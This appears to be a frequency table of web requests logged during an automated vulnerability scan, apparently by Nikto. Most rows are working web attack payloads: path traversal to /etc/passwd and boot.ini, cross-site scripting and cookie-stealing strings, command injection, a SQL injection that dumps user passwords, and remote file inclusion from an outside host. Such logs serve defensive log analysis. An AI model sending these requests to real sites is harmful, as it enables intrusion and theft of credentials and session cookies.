Frequency,Resource
1,/cgi-bin/auktion.cgi?menue=../../../../../../../../../../etc/passwd
1,virgil.cgi
1,/TvLBvkHh.asa
2,/upload/bank-icons/bank-gh.jpg
1,/cgi-bin/htmlscript?../../../../../../../../../../etc/passwd
1,/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
1,/servlet/org.apache.catalina.Globals/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/cgi-bin/LWGate
1,"/cgi-bin/FormMail.cgi?<script>alert(\""Vulnerable\"");</script>"
2,/mysql-admin/index.php
1,/TvLBvkHh.asp
1,/index.htm
1,/scripts/tools/dsnform.exe
1,/504/
1,/exchange/lib/logon.inc
1,/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E
1,/3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,/logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd%00|
1,/openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;
1,/sip/
1,/mailman/listinfo/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
2,/cgi-bin/cgiwrap/~nuucp
1,/cgi-bin/websendmail
1,/vgn/login
1,/cgi-bin/blog/mt-load.cgi
1,/cgi-bin/talkback.cgi?article=../../../../../../../../etc/passwd%00&action=view&matchview=1
1,/cgi-bin/hsx.cgi?show=../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.cp-1251
1,dansguardian.pl?DENIEDURL=</a><script>alert('Vulnerable');</script>
1,/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>
1,/cgi-bin/pagelog.cgi
1,/cd-cgi/sscd_suncourier.pl
1,/current/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd%00&bn=fm_d1
1,/admin/cplogfile.log
1,icat
1,/nsn/..%5Cutil/lancard.bas
5,/cgi-bin/MsmMask.exe?mask=/junk334
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.thtml
1,perlshop.cgi
1,cgicso?query=AAA
1,/exec/show/config/cr
1,/add.php3?url=ja&adurl=javascript:<script>alert('Vulnerable')</script>
1,/news/news.mdb
1,/webamil/test.php
1,/TvLBvkHh.cgi+
1,/forum/admin/database/wwForum.mdb
1,MsmMask.exe
1,/vgn/legacy/edit
1,/quikstore.cgi
1,//../../../../../../../../../../etc/passwd
1,"/administrator/upload.php?newbanner=1&choice=\""<script>alert(document.cookie)</script>"
1,/vendor/phpunit/phpunit/src/Util/Filter.php
1,/DomainFiles/*//../../../../../../../../../../etc/passwd
1,html2chtml.cgi
1,/cgi-bin/faqmanager.cgi?toc=/etc/passwd%00
1,/TvLBvkHh.nsconfig
1,/netget?sid=user&msg=300&file=../../../../../../../../../boot.ini
1,/cgi/cgiproc
1,/modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>
1,/bb-dnbd/faxsurvey
1,/wp-includes/js/nri.exe
1,/freefpbf/
1,/clientaccesspolicy.xml
1,/TvLBvkHh.2
1,/TvLBvkHh.1
1,/docs/showtemp.cfm?TYPE=JPEG&FILE=c:\boot.ini
1,"/include.php?path=contact.php&contact_email=\"">&lt;script&gt;alert(document.cookie);&lt;/script&gt;"
1,/cgi-bin/foxweb.exe
1,/TvLBvkHh.*
1,/forums//admin/config.php
1,/typo3conf/database.sql
2,cgiwrap/~ftp
2,/admin/index.php
1,/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef
1,/TvLBvkHh.SHOW
1,/%5BSecCheck%5D/../../ext.ini
1,/signon
1,/index.html.bak
1,diagnose.cgi
1,/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd
1,/cgi-bin/book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
4,/robots.txt
1,/cgi-bin/rpm_query
1,/cgi-bin/sewse?/home/httpd/html/sewse/jabber/comment2.jse+/etc/passwd
1,/cgi-bin/snorkerz.cmd
1,commerce.cgi?page=../../../../../../../../../../etc/passwd%00index.html
1,/iisadmin/
1,/cgi-bin/listrec.pl
2,formmail.pl
1,/servlet/com.livesoftware.jrun.plugins.ssi.SSIFilter
1,/TvLBvkHh.shm
1,/TvLBvkHh.c
1,/cgi-bin/cgitest.exe
1,/TvLBvkHh._
1,/global.asa
2,/dbadmin/index.php
1,/html/partner.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>
1,/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc
1,/cgi-bin/shop.cgi?page=../../../../../../../etc/passwd
1,/nsn/..%5Cutil/slist.bas
1,/cgi-bin/uploader.exe
1,/cgi-bin/com5..........................................................................................................................................................................................................................box
1,/TvLBvkHh.PWD
1,/TvLBvkHh.showsource
1,/cgi-bin/bannereditor.cgi
1,/cgi-bin/html2chtml.cgi
1,/*.*
1,archie
1,/TvLBvkHh.stm
1,/CVS/Entries
1,search
1,/cgi-bin/webspirs.cgi?sp.nextform=../../../../../../../../../../etc/passwd
1,/cgi-bin/generate.cgi?content=../../../../../../../../../../winnt/win.ini%00board=board_1
1,/cgi-bin/LWGate.cgi
1,/firmware/
1,test-env
1,/winbox.png
1,story/story.pl?next=../../../../../../../../../../etc/passwd%00
1,/%3Cscript%3Ealert(%22xss%22)%3C/script%3E/index.html
1,/nsn/..%5Cwebdemo/fdir.bas
1,/IlohaMail/blank.html
1,/cgi-bin/MachineInfo
1,/666%0A%0A%3Cscript%3Ealert('Vulnerable');%3C/script%3E666.jsp
1,start.cgi/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/cgi-bin/whois_raw.cgi?fqdn=%0Acat%20/etc/passwd
1,/autohtml.php?op=modload&mainfile=x&name=/etc/passwd
1,/TvLBvkHh.VALIDATE_STMT
1,/TvLBvkHh.de
2,/cgi-bin/cgiwrap/~nobody
1,/lpt9.xtp
1,/cfdocs/expeval/displayopenedfile.cfm
1,/..%5C..%5C..%5C..%5C..%5C..%5Ctemp%5Ctemp.class
1,/TvLBvkHh.dll
1,/vgn/jsp/metadataupdate
1,/cgi-bin/post-query
1,/cgi-bin/webfind.exe?keywords=01234567890123456789
1,/addressbook/index.php?surname=<script>alert('Vulnerable')</script>
1,/password.inc
5,/phpmyadmin/scripts/_setup.php
1,/cgi-bin/test-cgi.tcl
1,/msadc/samples/adctest.asp
1,SQLServ/sqlbrowse.asp?filepath=c:\&Opt=3
1,/nsn/..%5Cutil/chkvol.bas
1,/TvLBvkHh.cfg
1,/sshome/
1,/pw/storemgr.pw
1,/TvLBvkHh.cfc
1,/TvLBvkHh.cfm
1,/TvLBvkHh.en
1,/cgi-bin/blog/mt.cfg
1,/forums/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,admin.cgi?list=../../../../../../../../../../etc/passwd
1,hsx.cgi?show=../../../../../../../../../../../etc/passwd%00
1,/vgn/jsp/style
1,/cgi-bin/cart32.exe
1,php.cgi?/etc/passwd
1,cgiwrap
1,/modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>
1,/cgi-bin/YaBB/YaBB.cgi?board=BOARD&action=display&num=<script>alert('Vulnerable')</script>
1,main.cgi?board=FREE_BOARD&command=down_load&filename=../../../../../../../../../../etc/passwd
1,/../../../../../windows/win.ini
1,/cgi-bin/../abyss.conf
1,/vgn/asp/previewer
1,/webmail/horde/test.php
1,/profile.php?u=fL2ak4pL
1,generate.cgi?content=../../../../../../../../../../etc/passwd%00board=board_1
1,////./../.../boot.ini
1,/exchange/lib/AMPROPS.INC
1,mt-static/mt.cfg
1,/siteminder
1,/events4.nsf
1,bizdb1-search.cgi
2,/myadmin/scripts/setup.php
1,/cgi-bin/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd
1,/voice/
1,/cgi-local/cgiemail-1.4/cgicso?query=<script>alert('Vulnerable')</script>
1,/midicart.mdb
1,ssi//../../../../../../../etc/passwd
1,/webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd
1,/cgi-bin/plusmail
1,/modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test
1,/phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd
1,/cgi-bin/db4web_c/dbdirNikto//etc/passwd
1,wconsole.dll
1,/cgi-bin/vpasswd.cgi
1,/cgi-bin/view-source
1,/cgi-bin/htsearch.cgi?words=%22%3E%3Cscript%3Ealert%'Vulnerable'%29%3B%3C%2Fscript%3E
1,/servlet/org.apache.catalina.ContainerServlet/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/index.html
3,http://httpheader.net/
1,/scripts/samples/search/queryhit.idq
1,ans/ans.pl?p=../../../../../usr/bin/id|&blah
1,search.php?searchstring=<script>alert(document.cookie)</script>
1,/admentor/adminadmin.asp
1,/cgi-bin/bb-hostsvc.sh?HOSTSVC=../../../../../../../../../../etc/passwd
1,/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
4,/setup.php
2,cgiwrap/~sys
1,ImageFolio/admin/admin.cgi
2,/path/nw/article.php?id='
1,/splashAdmin.php
1,/servlet/webacc?User.html=noexist
1,cmd1.exe?/c+dir
1,/TvLBvkHh.printer
1,/c/winnt/system32/cmd.exe?/c+dir+/OG
1,/cgi-bin/whois.cgi?action=load&whois=%3Bid
1,/TvLBvkHh.list
1,/cgi-bin/perl?-v
1,/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.nsf
1,/pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit
1,webplus.exe?about
1,/cgi-bin/ssi//../../../../../../../etc/passwd
1,/cgi-bin/virgil.cgi
1,stat.pl
1,/index.php?file=index.php
1,traffic.cgi?cfg=../../../../../../../../etc/passwd
1,vpasswd.cgi
1,/cgi-bin/traffic.cgi?cfg=../../../../../../../../etc/passwd
1,/TiVoConnect?Command=QueryContainer&Container=/&Recurse=Yes
1,/z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825&
1,/uploadx.asp
1,/SilverStream/Meta/Tables/?access-mode=text
1,/exchange/lib/JSROOT.INC
1,/cgi-bin/info2www
1,/prxdocs/misc/prxrch.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,/ammerum/
1,/index.jhtml
1,common/listrec.pl
1,/TvLBvkHh.htaccess
1,/cgi-bin/sbcgi/sitebuilder.cgi
2,/db/index.php
1,/cgi-bin/calendar/calendar_admin.pl?config=|cat%20/etc/passwd|
1,/vgn/previewer
2,/mysqladmin/index.php
1,search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc
1,/TvLBvkHh.php
2,/hndUnblock.cgi
1,orders/orders.txt
1,/names.nsf
1,/scripts/iisadmin/ism.dll
1,/TvLBvkHh.rdf+destype=cache+desformat=PDF
3,/cgi-bin/cgiwrap/~root
1,/TvLBvkHh.log
1,/phpBB2/search.php?search_id=1\\
1,shopper.cgi?newpage=../../../../../../../../../../etc/passwd
1,/cgi-bin/input.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/quikstore.cfg
1,/somethingnotthere.ida
1,/cplogfile.log
1,/index.cgi
2,/admin/mysql2/index.php
1,/index.php/content/advancedsearch/?SearchText=<script>alert(document.cookie)</script>&PhraseSearchText=<script>alert(document.cookie)</script>&SearchContentClassID=-1&SearchSectionID=-1&SearchDate=-1&SearchButton=Search
1,/spa122/
1,/whatever.htr
1,/TvLBvkHh.pt-br
1,/TvLBvkHh.tw
1,hpnst.exe?c=p+i=SrvSystemInfo.html
1,/examples/jsp/snp/anything.snp
1,/cgis/
1,/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>
1,/index.php?download=/etc/passwd
2,/upload/bank-icons/bank_16.png
1,/cgi-bin/processit.pl
2,/x
1,/cgi-bin/mt-static/mt-check.cgi
1,gm-cplog.cgi
1,faxsurvey?cat%20/etc/passwd
1,/cgi-win/cgitest.exe
1,rpm_query
1,/panasonic/
2,cgiwrap/~lp
1,/cgi-bin/emu/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/wx/s.dll?d=/boot.ini
1,architext_query.cgi
1,/%5BSecCheck%5D/..%255c..%255c../ext.ini
1,/imp/mailbox.php3?actionID=6&server=x&imapuser=x';somesql+--&pass=x
1,/SiteServer/Admin/commerce/foundation/domain.asp
1,/TvLBvkHh.sh
1,/VoIP/
1,/_vti_bin/shtml.exe
2,/cgi-bin/cgiwrap/~listen
1,/default.php?info_message=%3Cscript%20language=javascript%3Ewindow.alert%28document.cookie%29;%3C/script%3E
1,/TvLBvkHh.se
1,"/postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
1,/whateverdXHZ.html
2,/xampp/phpmyadmin/index.php
1,/a%5C.aspx
1,/cfdocs/snippets/gettempdirectory.cfm
1,/cgi-bin/data/fetch.php?page=
1,/webadmin.nsf
1,/forums//phpmyadmin/config.php
1,"/cgi-bin/athcgi.exe?command=showpage&script='],[0,0]];alert('Vulnerable');a=[['"
1,/TvLBvkHh.save
1,/cgi-bin/csNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/basilix/message-read.php3
5,/php-my-admin/scripts/setup.php
1,/uploadn.asp
1,/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
1,/vgn/ac/fsave
1,/RELEASE-NOTES.txt
1,betsie/parserl.pl/%3Cscript%3Ealert('Vulnerable')%3C/script%3E;
1,/TvLBvkHh.properties
1,/852566C90012664F
1,db4web_c/dbdirname//etc/passwd
1,/cgi-bin/admin.cgi?list=../../../../../../../../../../etc/passwd
1,main.cgi?board=FREE_BOARD&command=down_load&fileNikto=../../../../../../../../../../etc/passwd
1,/cfdocs/snippets/viewexample.cfm
1,/home.asp
1,FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
1,/PlcmSpIp/
1,/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>
1,/cgi-bin/mgrqcgi
1,mail/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00
1,/search/sqlqhit.asp
1,/vgn/vr/Editing
1,/k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor
1,/pbserver/pbserver.dll
3,cgiwrap/~root
1,"/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
1,/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi?data_dir=\etc\passwd%00
1,/%25NETHOOD%25/
1,test2.pl?&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
1,/TiVoConnect?Command=QueryServer
1,/db/users.dat
1,/phpMyAdmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,/cfappman/index.cfm
1,"/administrator/gallery/gallery.php?directory=\""<script>alert(document.cookie)</script>"
1,/cersvr.nsf
1,wrap.cgi
1,aglimpse
1,/cgi-bin/webdist.cgi
1,/cgi-bin/mailnews.cgi
1,whois.cgi?action=load&whois=%3Bid
1,/scripts/proxy/w3proxy.dll
1,perl.exe?-v
1,/prov/
1,/statrep.nsf
1,/query.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,/filemanager/filemanager_forms.php?lib_path=http://cirt.net/rfiinc.txt?
1,/TvLBvkHh.box
1,/cgi-bin/stat.pl
1,/SilverStream
1,/../../../../../../../../../boot.ini
1,quickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=
1,/pma/index.php
1,urlcount.cgi?%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28%27Vulnerable%27%29%22%3E
1,/TvLBvkHh.cnf
1,/moo
2,"/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\""><script>alert(document.cookie)</script>"
1,webfind.exe?keywords=01234567890123456789
1,/cgi-bin/shtml.dll
1,/perl/-e%20print%20Hello
1,whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,index.js0x70
1,/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
1,/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1
1,/modules.php?op=modload&name=books&file=index&req=search&query=|script|alert(document.cookie)|/script|
1,/cgi-bin/date
1,/cgibin/
1,/TvLBvkHh.fhp
1,"/downloads/pafiledb.php?action=rate&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"""
1,/TvLBvkHh.Big5
1,/tree
5,/scripts/setup.php
1,/TvLBvkHh.
1,/TvLBvkHh/
1,/cgi-bin/AT-admin.cgi
2,/admin/PMA/index.php
1,/TvLBvkHh.access
1,bb-hostsvc.sh?HOSTSVC=../../../../../../../../../../etc/passwd
2,/mysql/index.php
1,/TvLBvkHh.inc+
1,formmail
1,/comments/browse.php?fid=2&tid=4&go=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
1,DCShop/orders/orders.txt
1,/launch.asp?NFuse_Application=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.exe
1,/webcart/orders/
1,/cgi-bin/icat
1,lwgate
1,/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00
1,/cgi-bin/dansguardian.pl?DENIEDURL=</a><script>alert('Vulnerable');</script>
1,uploader.exe
1,/cgi-exe/
1,/catinfo?<u><b>TESTING
1,/cgi-bin/viralator.cgi
2,/cgi-bin/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt?
1,/jigsaw/
1,/cgi-bin/com5.java
1,/user.php?op=userinfo&uname=<script>alert('hi');</script>
1,generate.cgi?content=../../../../../../../../../../windows/win.ini%00board=board_1
1,/aastra/
1,/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>
1,//comment.php?mode=Delete&sid=1&cid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,awstats/awstats.pl
1,gm-authors.cgi
1,/TvLBvkHh.cwr
1,/cgi-bin/fom/fom.cgi?cmd=<script>alert('Vulnerable')</script>&file=1&keywords=vulnerable
1,/cgi-bin/admin/setup.cgi
1,wais.pl
2,cgiwrap/~daemon
1,/ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1
5,/phpMyAdmin/scripts/_setup.php
2,/getcfg.php
1,classifieds/index.cgi
1,/TvLBvkHh.nsfdeslo
1,/images
2,/download.php?op=viewdownload
1,/index.php?download=/windows/win.ini
1,/pccsmysqladm/incs/dbconnect.inc
1,/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month=
1,flexform.cgi
1,/ISSamples/sqlqhit.asp
1,/examples/basic/servlet/HelloServlet
2,/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=
1,Album?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0
1,/cgi-bin/cgiwrap/%3Cfont%20color=red%3E
1,/examples/servlet/TroubleShooter
1,/prd.i/pgen/
1,modules/vwar/admin/config.php
1,/cgi-bin/cgicso?query=<script>alert('Vulnerable')</script>
1,/admin/config.php
1,/phpmyadmin/phpmyadmin/index.php
1,/uySJie59sZ
1,test-cgi?/*
1,/nsn/..%5Cutil/md.bas
1,/php/php.exe?c:\boot.ini
1,/TvLBvkHh.htpasswd
1,"/downloads/pafiledb.php?action=email&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"""
1,htsearch?exclude=%60/etc/passwd%60
1,/test.php%20
1,webdist.cgi?distloc=;cat%20/etc/passwd
1,/vgn/jsp/jspstatus
2,cgiwrap/~bin
2,cgiwrap/~listen
1,/setup.nsf
1,/cgi-bin/SQLServ/sqlbrowse.asp?filepath=c:\&Opt=3
1,/chat/!pwds.txt
1,/cgi-bin/cachemgr.cgi
1,/cgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah
1,/author.asp
1,/default.aspx
1,/web-console/ServerInfo.jsp%00
1,"/ca000007.pl?ACTION=SHOWCART&REFPAGE=\""><script>alert('Vulnerable')</script>"
1,/cbms/cbmsfoot.php
1,/index.cfm
1,/nsn/..%5Cutil/copy.bas
1,/provision/
1,htsearch.cgi?words=%22%3E%3Cscript%3Ealert%'Vulnerable'%29%3B%3C%2Fscript%3E
5,/phpMyAdmin2/scripts/setup.php
1,/servlet/org.apache.catalina.Context/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
